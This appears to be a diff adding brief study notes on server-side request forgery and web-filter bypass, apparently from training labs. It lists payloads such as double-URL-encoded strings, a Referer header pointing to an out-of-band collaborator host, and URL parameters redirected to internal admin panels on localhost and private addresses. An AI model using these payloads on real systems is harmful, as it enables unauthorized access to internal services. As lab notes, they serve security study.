@@ -1,0 +1,26 @@
+WAF BYPASS
+> If string is denied, such as admin, try obfuscate by double url encoding charater:
+a
+%61
+%25%36%31
+%25%36%31dmin
+
+INTERNAL HOST SCANNING
+> replace host with internal value
+
+OUT-OF-BAND INTERACTION
+> change referer, + see collobarator everywhere extension
+Referer: collobarator.com
+
+ACCESS ADMIN PANEL
+> if you see parameter accepting url as value, alter this url to an internal endpoint such as:
+http://localhost/admin
+> Use wordlist file
+> Try obfuscation
+> Try localhost / 192.168.1.$X$
+
+SSRF via OPEN-REDIRECTION
+> find open redirection
+> find param accepting urls
+> replace param pointing to openredirection of internal panel
+stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
